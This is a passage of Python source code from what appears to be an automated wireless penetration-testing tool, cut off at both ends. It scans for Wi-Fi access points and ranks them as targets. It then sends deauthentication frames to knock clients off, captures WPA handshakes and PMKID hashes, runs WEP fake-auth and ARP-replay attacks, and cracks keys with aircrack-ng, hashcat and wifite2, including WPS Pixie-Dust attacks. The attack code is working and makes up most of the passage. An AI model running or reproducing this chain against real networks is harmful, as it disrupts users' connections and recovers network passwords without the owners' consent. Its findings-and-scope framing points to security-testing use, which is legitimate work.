                    with open(csv_file, encoding="utf-8", errors="replace") as f:
                        lines = f.read().splitlines()
                    for raw in lines[2:]:
                        stripped = raw.strip()
                        if not stripped or stripped.lower().startswith("station mac"):
                            break
                        parts = [p.strip() for p in stripped.split(",")]
                        if len(parts) < 14:
                            continue
                        bssid = parts[0]
                        if not re.match(
                            r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid
                        ):
                            continue
                        channel_str = parts[3].strip()
                        enc         = parts[5].strip()
                        ssid        = parts[13].strip()
                        try:
                            ch = int(channel_str)
                        except ValueError:
                            ch = 0
                        ssid_ok  = (not target_ssids)  or (ssid  in target_ssids)
                        bssid_ok = (not target_bssids) or (
                            bssid.upper() in [b.upper() for b in target_bssids]
                        )
                        if ssid_ok and bssid_ok:
                            discovered.append({
                                "ssid": ssid, "bssid": bssid,
                                "channel": ch, "encryption": enc, "wps": False,
                            })
                except Exception as exc:
                    err(f"Scan CSV parse error: {exc}")
    else:
        # iwlist fallback
        out, _ = _run(["sudo", "iwlist", monitor_iface, "scan"], timeout=30)
        current: dict = {}

        def _commit(ap: dict) -> None:
            if not ap.get("ssid"):
                return
            ssid_ok  = (not target_ssids) or (ap["ssid"] in target_ssids)
            bssid_ok = (not target_bssids) or (
                ap.get("bssid", "").upper() in [b.upper() for b in target_bssids]
            )
            if ssid_ok and bssid_ok:
                discovered.append(ap)

        for line in out.splitlines():
            line = line.strip()
            if "Cell" in line and "Address:" in line:
                _commit(current)
                m = re.search(r'Address:\s+(\S+)', line)
                current = {
                    "bssid": m.group(1) if m else "", "ssid": "",
                    "channel": 0, "encryption": "UNKNOWN", "wps": False,
                }
            elif "ESSID:" in line:
                m = re.search(r'ESSID:"([^"]*)"', line)
                if m:
                    current["ssid"] = m.group(1)
            elif "Channel:" in line:
                m = re.search(r'Channel:(\d+)', line)
                if m:
                    current["channel"] = int(m.group(1))
            elif "IE:" in line:
                if re.search(r'WPA2\s+Version|RSN', line, re.I):
                    current["encryption"] = "WPA2"
                elif re.search(r'WPA\s+Version', line, re.I):
                    if current.get("encryption") not in ("WPA2",):
                        current["encryption"] = "WPA"
            elif "Encryption key:" in line:
                if current.get("encryption") == "UNKNOWN":
                    current["encryption"] = "WEP" if "on" in line else "OPN"
        _commit(current)

    # Harvest WPS results from background wash process
    if wps_proc is not None:
        try:
            # Drain remaining output collected during airodump-ng sleep
            remaining_out, _ = wps_proc.communicate(timeout=3)
            for line in remaining_out.decode("utf-8", errors="replace").splitlines():
                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line.strip())
                if m:
                    wps_bssids.add(m.group(1).upper())
        except Exception:
            _kill_proc(wps_proc)

    # Annotate discovered APs with WPS status + emit per-AP findings
    log(f"Discovered {len(discovered)} target AP(s)")
    for ap in discovered:
        bssid_upper = ap.get("bssid", "").upper()
        enc         = ap.get("encryption", "")
        ssid        = ap.get("ssid", "")

        # Mark WPS status
        if bssid_upper in wps_bssids:
            ap["wps"] = True

        log(f"  AP: {ssid!r} [{ap['bssid']}] "
            f"ch={ap['channel']} enc={enc} wps={ap['wps']}")

        # Open / unencrypted network
        if not enc or enc.upper() in ("OPN", "OPEN"):
            finding_from_cat(
                "AETHER-014",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"Open / Unencrypted Network: {ssid}",
            )

        # WPS enabled — exposes AP to Pixie-Dust and PIN brute-force
        if ap["wps"]:
            finding_from_cat(
                "AETHER-015",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"WPS Enabled: {ssid}",
            )

        # WPA3-Transition mode — WPA2+WPA3 mixed; downgrade surface
        # airodump-ng reports transition APs with "WPA2 WPA3" or "SAE WPA2" in enc field
        if (re.search(r'WPA3|SAE', enc, re.I) and re.search(r'WPA2|PSK', enc, re.I)):
            finding_from_cat(
                "AETHER-016",
                data={"ssid": ssid, "bssid": ap["bssid"], "encryption": enc},
                title_override=f"WPA3 Transition Mode (Downgrade Surface): {ssid}",
            )

    return discovered


# ── Wireless Intelligence helpers ─────────────────────────────────────────────


def _parse_airodump_csv_full(csv_path: str) -> tuple[list[dict], list[dict]]:
    """Parse a complete airodump-ng CSV into (ap_list, station_list).

    AP fields:      bssid, channel, speed, encryption, cipher, auth,
                    signal, beacons, ssid, clients, client_count,
                    score, best_target, wps
    Station fields: mac, signal, packets, bssid (of associated AP), probed
    """
    aps: list[dict]      = []
    stations: list[dict] = []
    in_stations          = False

    def _int(v: str) -> int:
        try:
            return int(v)
        except (ValueError, TypeError):
            return 0

    try:
        with open(csv_path, encoding="utf-8", errors="replace") as fh:
            lines = fh.read().splitlines()
    except Exception:
        return aps, stations

    for raw in lines:
        stripped = raw.strip()
        if not stripped:
            continue
        low = stripped.lower()
        if low.startswith("bssid"):
            in_stations = False
            continue
        if low.startswith("station mac"):
            in_stations = True
            continue

        parts = [p.strip() for p in stripped.split(",")]

        if not in_stations:
            if len(parts) < 14:
                continue
            bssid = parts[0]
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                continue
            aps.append({
                "bssid":        bssid,
                "channel":      _int(parts[3]),
                "speed":        _int(parts[4]),
                "encryption":   parts[5],
                "cipher":       parts[6],
                "auth":         parts[7],
                "signal":       _int(parts[8]),
                "beacons":      _int(parts[9]),
                "ssid":         parts[13],
                "clients":      [],
                "client_count": 0,
                "score":        0.0,
                "best_target":  False,
                "wps":          False,
            })
        else:
            if len(parts) < 6:
                continue
            mac = parts[0]
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                continue
            stations.append({
                "mac":     mac,
                "signal":  _int(parts[3]),
                "packets": _int(parts[4]),
                "bssid":   parts[5],
                "probed":  parts[6] if len(parts) > 6 else "",
            })

    return aps, stations


def _score_ap(signal: int, client_count: int) -> float:
    """Score an AP 0–100: 40 % signal strength, 60 % connected clients.

    Signal is normalised from -90 dBm (worst) to -30 dBm (best).
    Client score saturates at 4 clients (25 pts each).
    APs with clients are strongly preferred because they yield handshakes.
    """
    sig_norm     = max(-90, min(-30, signal)) if signal < 0 else -90
    sig_score    = (sig_norm + 90) * (100.0 / 60.0)
    client_score = min(100.0, client_count * 25.0)
    return round(sig_score * 0.4 + client_score * 0.6, 1)


def phase_wireless_intel(
    monitor_iface: str,
    target_ssids:  list[str],
    target_bssids: list[str],
    output_dir:    Path,
    scan_seconds:  int = 45,
) -> tuple[dict | None, list[dict]]:
    """Phase 0-I: Deep wireless intelligence.

    Runs a dedicated airodump-ng scan with parallel WPS detection (wash).
    For every AP broadcasting the target SSID(s):
      - captures full metadata (encryption, cipher, auth, signal, beacons)
      - identifies every connected client station
      - scores each AP (signal + client count)
      - selects the best target

    Writes access_points.json to output_dir.
    Returns (best_ap, all_enriched_aps).
    """
    status("p0_intel", "Phase 0-I: Wireless Intelligence", "running")
    intel_dir = output_dir / "wireless_intel"
    intel_dir.mkdir(parents=True, exist_ok=True)

    if not shutil.which("airodump-ng"):
        log("[0-I] airodump-ng not found — skipping wireless intelligence scan")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "skipped",
               "airodump-ng not installed")
        return None, []

    log(f"[0-I] Wireless intelligence scan ({scan_seconds}s, --write-interval 5)…")
    if target_ssids:
        log(f"[0-I] Targeting SSID(s): {', '.join(repr(s) for s in target_ssids)}")

    # WPS detection runs in parallel
    wps_bssids: set[str] = set()
    wps_proc             = None
    if shutil.which("wash"):
        try:
            wps_proc = _popen(["sudo", "wash", "-i", monitor_iface, "-C"],
                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    out_prefix = str(intel_dir / "intel_scan")
    cmd = [
        "sudo", "airodump-ng",
        "--write", out_prefix,
        "--output-format", "csv",
        "--write-interval", "5",
        "--band", "abg",
    ]
    if target_ssids and len(target_ssids) == 1:
        cmd += ["--essid", target_ssids[0]]
    if target_bssids and len(target_bssids) == 1:
        cmd += ["--bssid", target_bssids[0]]
    cmd.append(monitor_iface)

    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(scan_seconds)
    except Exception as exc:
        log(f"[0-I] airodump-ng error: {exc}")
    finally:
        if proc is not None:
            _kill_proc(proc)

    # Harvest WPS results
    if wps_proc is not None:
        try:
            remaining, _ = wps_proc.communicate(timeout=3)
            for ln in remaining.decode("utf-8", errors="replace").splitlines():
                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', ln.strip())
                if m:
                    wps_bssids.add(m.group(1).upper())
        except Exception:
            _kill_proc(wps_proc)

    csv_file = out_prefix + "-01.csv"
    if not os.path.exists(csv_file):
        log("[0-I] No scan data collected")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "error",
               "no data collected")
        return None, []

    aps, stations = _parse_airodump_csv_full(csv_file)

    # Filter to configured target scope
    target_bssids_up = {b.upper() for b in (target_bssids or [])}
    filtered: list[dict] = []
    for ap in aps:
        ssid_ok  = (not target_ssids)     or (ap["ssid"] in target_ssids)
        bssid_ok = (not target_bssids_up) or (ap["bssid"].upper() in target_bssids_up)
        if ssid_ok and bssid_ok:
            ap["wps"] = ap["bssid"].upper() in wps_bssids
            filtered.append(ap)

    if not filtered:
        log("[0-I] No APs found matching target SSID(s)")
        status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete")
        return None, []

    # Assign client stations to their APs
    bssid_index = {ap["bssid"].upper(): ap for ap in filtered}
    for sta in stations:
        ap_bssid = sta.get("bssid", "").upper()
        if ap_bssid in bssid_index:
            bssid_index[ap_bssid]["clients"].append({
                "mac":     sta["mac"],
                "signal":  sta["signal"],
                "packets": sta["packets"],
            })

    # Score and rank APs
    for ap in filtered:
        ap["client_count"] = len(ap["clients"])
        ap["score"]        = _score_ap(ap["signal"], ap["client_count"])
    filtered.sort(key=lambda a: a["score"], reverse=True)
    if filtered:
        filtered[0]["best_target"] = True

    # Emit finding for multi-AP scenario
    ssid_label = target_ssids[0] if target_ssids else filtered[0]["ssid"]
    if len(filtered) > 1:
        finding(
            title=f"Multiple APs Broadcasting SSID: {ssid_label}",
            severity="INFO",
            description=(
                f"{len(filtered)} access points are broadcasting '{ssid_label}'. "
                f"This may indicate a distributed enterprise network or an Evil Twin "
                f"deployment opportunity."
            ),
            data={"ap_count": len(filtered),
                  "bssids": [ap["bssid"] for ap in filtered]},
        )

    # Log results
    total_clients = sum(ap["client_count"] for ap in filtered)
    log(f"[0-I] Found {len(filtered)} AP(s), {total_clients} total client(s):")
    for ap in filtered:
        enc_str = " / ".join(
            p for p in [ap["encryption"], ap["cipher"], ap["auth"]] if p.strip()
        )
        tag = "  ◄ BEST TARGET" if ap["best_target"] else ""
        log(f"  {'★' if ap['best_target'] else '·'} {ap['ssid']!r} "
            f"[{ap['bssid']}] ch={ap['channel']} "
            f"sig={ap['signal']}dBm  enc={enc_str}  "
            f"wps={ap['wps']}  clients={ap['client_count']}  "
            f"score={ap['score']}{tag}")
        for c in ap["clients"]:
            log(f"      ↳ {c['mac']}  sig={c['signal']}dBm  pkts={c['packets']}")

    # Persist to access_points.json (read by Spectre Access Points tab)
    ap_json_path = output_dir / "access_points.json"
    ap_json_path.write_text(json.dumps({
        "scan_time":    datetime.now().isoformat(),
        "target_ssids": target_ssids,
        "access_points": filtered,
    }, indent=2), encoding="utf-8")
    log(f"[0-I] Wrote {ap_json_path}")

    best = filtered[0]
    status("p0_intel", "Phase 0-I: Wireless Intelligence", "complete",
           f"{len(filtered)} AP(s) | best: {best['bssid']}")
    return best, filtered


def _deauth_clients(
    monitor_iface: str,
    bssid:         str,
    channel:       int,
    clients:       list[dict],
    deauth_count:  int = 5,
) -> None:
    """Send deauthentication frames via aireplay-ng to force client re-association.

    Sends targeted frames to each known client MAC; falls back to broadcast
    deauth if no client list is available.
    """
    if not shutil.which("aireplay-ng"):
        log("[1c] aireplay-ng not found — cannot send deauth frames")
        return
    if channel > 0:
        _run(["sudo", "iwconfig", monitor_iface, "channel", str(channel)], timeout=5)
    if clients:
        for c in clients:
            mac = c.get("mac", "")
            if not mac:
                continue
            log(f"[1c] Deauth ×{deauth_count} → {mac} from {bssid}")
            _run(["sudo", "aireplay-ng",
                  "-0", str(deauth_count),
                  "-a", bssid, "-c", mac,
                  monitor_iface],
                 timeout=deauth_count * 2 + 10)
    else:
        log(f"[1c] Broadcast deauth ×{deauth_count} → {bssid}")
        _run(["sudo", "aireplay-ng",
              "-0", str(deauth_count),
              "-a", bssid,
              monitor_iface],
             timeout=deauth_count * 2 + 10)


def phase_deauth_handshake(
    monitor_iface: str,
    enriched_aps:  list[dict],
    output_dir:    Path,
    wordlist:      str | None,
    timeout:       int = 300,
    deauth_count:  int = 5,
) -> None:
    """Phase 1c: Targeted deauth + dedicated handshake capture.

    For each in-scope AP that has connected clients (best-scored first):
      1. Start airodump-ng capture on the AP's specific BSSID + channel
      2. Send targeted deauth frames to each connected client
      3. Wait for airodump-ng to confirm WPA handshake capture
      4. Attempt aircrack-ng dictionary crack if a wordlist is configured

    Emits AETHER-002 only when handshake capture is confirmed by airodump-ng
    stdout — never on error output alone.
    """
    if not shutil.which("airodump-ng"):
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "airodump-ng not installed")
        return
    if not shutil.which("aireplay-ng"):
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "aireplay-ng not installed")
        return

    aps_scoped = [ap for ap in enriched_aps if _in_scope(ap)]
    aps_with_clients = [ap for ap in aps_scoped if ap.get("clients")]
    if not aps_with_clients:
        log("[1c] No connected clients discovered — cannot perform targeted deauth")
        log("[1c] Tip: wait for clients or use Phase 1a (PMKID) for clientless capture")
        status("p1c_deauth", "Phase 1c: Deauth + Handshake", "skipped",
               "no clients discovered")
        return

    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "running")
    deauth_dir = output_dir / "deauth_handshake"
    deauth_dir.mkdir(parents=True, exist_ok=True)

    for ap in sorted(aps_with_clients, key=lambda a: a.get("score", 0), reverse=True):
        ssid    = ap.get("ssid", "")
        bssid   = ap["bssid"]
        channel = ap.get("channel", 0)
        clients = ap.get("clients", [])
        safe    = re.sub(r'[^\w]', '_', ssid or bssid)
        cap_prefix = str(deauth_dir / f"cap_{safe}")

        log(f"[1c] Target: {ssid!r} [{bssid}] ch={channel} "
            f"clients={len(clients)} score={ap.get('score', 0)}")

        # Start dedicated capture on this BSSID + channel
        cap_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", cap_prefix,
            "--output-format", "cap",
            monitor_iface,
        ]
        cap_proc           = None
        handshake_captured = False
        try:
            cap_proc = _popen(cap_cmd,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
            time.sleep(3)  # let capture stabilise before deauth
            _deauth_clients(monitor_iface, bssid, channel, clients, deauth_count)

            # Monitor airodump output for handshake confirmation
            deadline = time.time() + min(timeout, 90)
            while time.time() < deadline:
                if cap_proc.poll() is not None:
                    break
                if cap_proc.stdout:
                    line = _readline_timed(cap_proc.stdout,
                                           min(deadline, time.time() + 2))
                    if line:
                        decoded = _strip_ansi(
                            line.decode("utf-8", errors="replace").rstrip()
                        )
                        if decoded.strip():
                            log(decoded)
                        if re.search(r'WPA handshake', decoded, re.I):
                            handshake_captured = True
                            log(f"[1c] ✓ WPA handshake captured for {ssid!r}")
                            break
                else:
                    time.sleep(2)
        finally:
            if cap_proc is not None:
                _kill_proc(cap_proc)

        cap_file = cap_prefix + "-01.cap"
        if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
            log(f"[1c] No capture data for {ssid!r}")
            continue

        if handshake_captured:
            finding_from_cat(
                "AETHER-002",
                data={"ssid": ssid, "bssid": bssid, "attack": "deauth",
                      "clients_deauthed": len(clients)},
                output_file=cap_file,
                title_override=f"WPA Handshake Captured via Deauth: {ssid}",
            )

        # Attempt dictionary crack with aircrack-ng
        if wordlist and os.path.exists(wordlist) and shutil.which("aircrack-ng"):
            log(f"[1c] Cracking {ssid!r} with aircrack-ng…")
            crack_out, _ = _run([
                "sudo", "aircrack-ng",
                "-w", wordlist,
                "-b", bssid,
                cap_file,
            ], timeout=min(timeout, 600))
            (deauth_dir / f"aircrack_{safe}.txt").write_text(
                crack_out, encoding="utf-8"
            )
            m_key = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', crack_out)
            if m_key:
                psk = m_key.group(1)
                log(f"[1c] KEY FOUND for {ssid!r}: {psk}")
                finding(
                    title=f"WPA Pre-Shared Key Cracked via Deauth: {ssid}",
                    severity="CRITICAL",
                    description=(
                        f"Deauthentication attack on '{ssid}' [{bssid}] forced "
                        f"client re-association, capturing the WPA 4-way handshake. "
                        f"The PSK was recovered via dictionary attack: '{psk}'."
                    ),
                    data={"ssid": ssid, "bssid": bssid, "psk": psk,
                          "attack": "deauth+aircrack"},
                    output_file=cap_file,
                    cvss_score=9.0,
                    cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                )
            elif not handshake_captured:
                log(f"[1c] No confirmed handshake for {ssid!r} — nothing to crack")

    status("p1c_deauth", "Phase 1c: Deauth + Handshake", "complete")


# ── Phase 0: WEP IV capture + PTW cracking ───────────────────────────────────

def phase_wep(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 0: WEP testing via IV capture + ARP replay injection + PTW crack.
    Includes fake open-system authentication (aireplay-ng -1) to ensure
    the attacking station is associated before injecting ARPs — required
    when the AP has no active clients.
    """
    if not shutil.which("aircrack-ng") or not shutil.which("airodump-ng"):
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "aircrack-ng not installed")
        return

    wep_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and "WEP" in ap.get("encryption", "").upper()
        and "WPA" not in ap.get("encryption", "").upper()
    ]
    if not wep_aps:
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "no WEP networks found")
        return

    status("p0_wep", "Phase 0: WEP Testing", "running")
    wep_dir = output_dir / "wep"
    wep_dir.mkdir(parents=True, exist_ok=True)

    for ap in wep_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        safe    = re.sub(r'[^\w]', '_', ssid or bssid)

        finding_from_cat(
            "AETHER-012",
            data={"ssid": ssid, "bssid": bssid, "channel": channel},
            title_override=f"WEP Encryption in Use: {ssid}",
        )

        cap_prefix = str(wep_dir / f"cap_{safe}")

        # Step 1: fake open-system authentication — associates our NIC so
        # we can inject ARP packets even when no legitimate client is present.
        if shutil.which("aireplay-ng"):
            log(f"[0] WEP: fake auth → {ssid!r} [{bssid}]")
            _run([
                "sudo", "aireplay-ng",
                "-1", "0",          # fake auth, reassoc interval 0
                "-e", ssid,
                "-a", bssid,
                monitor_iface,
            ], timeout=15)

        dump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid, "--channel", str(channel),
            "--write", cap_prefix, "--output-format", "cap",
            monitor_iface,
        ]
        replay_cmd = [
            "sudo", "aireplay-ng",
            "--arpreplay", "-b", bssid, "-x", "1000",
            monitor_iface,
        ]

        log(f"[0] WEP: IV capture + ARP replay on {ssid!r} [{bssid}] ch={channel}")
        dump_proc   = None
        replay_proc = None
        try:
            dump_proc = _popen(dump_cmd,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            replay_proc = _popen(replay_cmd,
                                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if replay_proc.stdout is None:
                raise RuntimeError("aireplay-ng stdout unavailable")
            deadline = time.time() + timeout
            last_crack = time.time()
            while True:
                line = _readline_timed(replay_proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                if decoded:
                    log(decoded)
                # Progressive crack: attempt every 5 000 new IVs
                iv_m = re.search(r'#Data:\s*(\d+)', decoded)
                if iv_m and int(iv_m.group(1)) >= 5000 and time.time() - last_crack > 30:
                    last_crack = time.time()
                    cap_files  = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
                    if cap_files:
                        quick_out, _ = _run(
                            ["sudo", "aircrack-ng", "-b", bssid]
                            + [str(c) for c in cap_files],
                            timeout=30,
                        )
                        if "KEY FOUND!" in quick_out:
                            log("[0] WEP: key found during progressive crack — stopping")
                            break
        finally:
            if replay_proc is not None:
                _kill_proc(replay_proc)
            if dump_proc is not None:
                _kill_proc(dump_proc)

        # Final PTW crack on all collected captures
        cap_files = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
        if not cap_files:
            log(f"[0] WEP: no capture files for {ssid!r}")
            continue
        crack_cmd  = ["sudo", "aircrack-ng", "-b", bssid] + [str(c) for c in cap_files]
        log(f"[0] WEP: final PTW crack on {len(cap_files)} file(s)")
        crack_out, _ = _run(crack_cmd, timeout=120)
        log(crack_out)
        m_key = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', crack_out, re.I)
        if m_key:
            finding_from_cat(
                "AETHER-013",
                data={"ssid": ssid, "bssid": bssid, "key": m_key.group(1)},
                output_file=cap_prefix + "-01.cap",
                title_override=f"WEP Key Cracked: {ssid}",
            )

    status("p0_wep", "Phase 0: WEP Testing", "complete")


# ── Phase 1a: hcxdumptool — clientless PMKID capture + hashcat cracking ───────

def phase_pmkid(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 60,
    wordlist: str | None = None,
    hashcat_rules: list[str] | None = None,
) -> None:
    """
    Phase 1a: Dedicated PMKID clientless capture using hcxdumptool.
    The PMKID attack requires only a single frame exchange with the AP —
    no connected clients and no deauthentication needed.
    After capture, attempts hashcat cracking with staged wordlists + rules.

    Tool chain: hcxdumptool → hcxpcapngtool → hashcat (-m 22000)
    """
    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped",
               "hcxdumptool / hcxpcapngtool not installed")
        return

    scoped_aps = [ap for ap in target_aps if _in_scope(ap)]
    if not scoped_aps:
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped", "no targets")
        return

    status("p1a_pmkid", "Phase 1a: PMKID Capture", "running")
    pmkid_dir = output_dir / "pmkid"
    pmkid_dir.mkdir(parents=True, exist_ok=True)

    # Build BSSID filter file for hcxdumptool
    bssid_filter = pmkid_dir / "bssids.txt"
    bssids = [ap["bssid"] for ap in scoped_aps if ap.get("bssid")]
    if bssids:
        bssid_filter.write_text("\n".join(bssids) + "\n", encoding="utf-8")

    pcapng_file = pmkid_dir / "capture.pcapng"
    cmd = [
        "sudo", "hcxdumptool",
        "-i", monitor_iface,
        "-w", str(pcapng_file),
        "--rds=1",              # randomize source MAC per frame
    ]
    if bssids:
        cmd += [f"--filterlist_ap={bssid_filter}", "--filtermode=2"]

    log(f"[1a] hcxdumptool: PMKID capture ({timeout}s, {len(bssids)} target(s))")
    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(timeout)
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)

    if not pcapng_file.exists() or pcapng_file.stat().st_size == 0:
        log("[1a] hcxdumptool: no capture data collected")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Convert pcapng → hc22000
    hc22000_file = pmkid_dir / "hashes.hc22000"
    conv_out, rc = _run([
        "hcxpcapngtool",
        "-o", str(hc22000_file),
        str(pcapng_file),
    ], timeout=60)
    log(conv_out.strip())

    if not hc22000_file.exists() or hc22000_file.stat().st_size == 0:
        log("[1a] hcxpcapngtool: no PMKID/EAPOL hashes extracted")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Count extracted hashes and emit a finding for each SSID captured
    hash_lines = [l for l in hc22000_file.read_text(encoding="utf-8").splitlines() if l.strip()]
    log(f"[1a] Extracted {len(hash_lines)} PMKID/EAPOL hash(es)")
    seen_ssids: set[str] = set()
    for hl in hash_lines:
        # hc22000 format: type*bssid_hex*client_hex*essid_hex*hash
        parts = hl.split("*")
        if len(parts) >= 4:
            try:
                ssid_from_hash = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
            except Exception:
                ssid_from_hash = ""
            if ssid_from_hash and ssid_from_hash not in seen_ssids:
                seen_ssids.add(ssid_from_hash)
                finding_from_cat(
                    "AETHER-017",
                    data={"ssid": ssid_from_hash, "hash_file": str(hc22000_file)},
                    output_file=str(hc22000_file),
                    title_override=f"PMKID / EAPOL Hash Captured: {ssid_from_hash}",
                )

    # Attempt hashcat cracking if available
    if not shutil.which("hashcat"):
        log("[1a] hashcat not available — hash file saved for external cracking")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    rules = hashcat_rules or []
    # Stage 1: wordlist only (targeted)
    stages: list[tuple[str | None, str | None]] = [(wordlist, None)]
    # Stage 2+: wordlist + each rule file
    for rule in rules:
        if os.path.exists(rule):
            stages.append((wordlist, rule))

    for stage_wl, stage_rule in stages:
        if not stage_wl or not os.path.exists(stage_wl):
            continue
        hc_cmd = [
            "hashcat", "-m", "22000",
            "--potfile-path", str(pmkid_dir / "hashcat.potfile"),
            "--status", "--status-timer", "30",
            str(hc22000_file), stage_wl,
        ]
        if stage_rule:
            hc_cmd += ["-r", stage_rule]
            log(f"[1a] hashcat: stage with rule {Path(stage_rule).name}")
        else:
            log(f"[1a] hashcat: stage — wordlist only")
        hc_out, _ = _run(hc_cmd, timeout=600)
        # Extract cracked results from potfile
        potfile = pmkid_dir / "hashcat.potfile"
        if potfile.exists():
            for pot_line in potfile.read_text(encoding="utf-8").splitlines():
                if ":" in pot_line:
                    psk = pot_line.rsplit(":", 1)[-1]
                    # Find matching SSID from hash line
                    for hl in hash_lines:
                        parts = hl.split("*")
                        if len(parts) >= 4 and pot_line.split(":")[0] in hl:
                            try:
                                ssid_crack = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
                            except Exception:
                                ssid_crack = "unknown"
                            finding_from_cat(
                                "AETHER-001",
                                data={"ssid": ssid_crack, "psk": psk,
                                      "attack": "PMKID + hashcat"},
                                output_file=str(hc22000_file),
                                title_override=f"WPA PSK Cracked via PMKID: {ssid_crack}",
                            )
                            break

    status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")


# ── Phase 1b: wifite2 — WPA/WPA2/WPA3 handshake + WPS ───────────────────────
# wifite2 — originally derv82, actively maintained by kimocoder

def phase_wifite(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list,
    wordlist: str | None,
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 1b: wifite2 automated WPA/WPA2/WPA3 handshake + WPS attacks.
    Uses the SSID-seeded wordlist (mutations from SSID name merged with the
    base wordlist) to improve cracking success rates over wordlist alone.
    """
    wifite_path = shutil.which("wifite") or shutil.which("wifite2")
    if not wifite_path:
        log("[~] wifite2 not installed — skipping Phase 1b")
        status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "skipped",
               "wifite2 not installed")
        return

    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "running")
    wifite_dir = output_dir / "wifite"
    wifite_dir.mkdir(parents=True, exist_ok=True)

    cmd = [
        "sudo", wifite_path,
        "--kill",
        "--wpa",
        "--wps",
        "--pmkid",
        "-i", monitor_iface,
        "--wpat",  str(min(timeout, 60)),
        "--wpadt", "10",
    ]

    def _parse_output(out_lines: list[str], ssid: str, out_file: Path) -> None:
        seen: set[str] = set()
        for line in out_lines:
            if re.search(r'WPA.*?key.*?:.*?\S|Cracked|password', line, re.I):
                m = re.search(r'(?:key|password)[:\s]+(\S+)', line, re.I)
                psk   = m.group(1) if m else "(see output)"
                title = f"WPA Pre-Shared Key Cracked: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-001",
                        data={"ssid": ssid, "psk": psk, "attack": "wifite2"},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(
                r'(?:WPA handshake:|saved.*\.cap|\.hc22000|PMKID captured'
                r'|\[\+\].*(?:handshake|PMKID))',
                line, re.I
            ):
                title = f"WPA Handshake / PMKID Captured: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-002",
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(r'WPS.*?pin|pixie.*?dust|wps.*?cracked', line, re.I):
                title = f"WPS PIN / Pixie Dust Succeeded: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding(
                        title=title,
                        severity="CRITICAL",
                        description=(
                            f"wifite2 cracked WPS on '{ssid}' via Pixie Dust or PIN "
                            f"brute-force. The AP's WPS is vulnerable and the full "
                            f"WPA2 key is exposed."
                        ),
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        cvss_score=8.8,
                        cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    )

    def _run_wifite(extra_args: list, out_file: Path, label: str,
                    merged_wl: str | None) -> None:
        _cmd = cmd[:]
        if merged_wl and os.path.exists(merged_wl):
            _cmd += ["--dict", merged_wl]
        _cmd += extra_args
        try:
            proc = _popen(_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(wifite_dir))
            if proc.stdout is None:
                raise RuntimeError("wifite2 stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout + 30
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
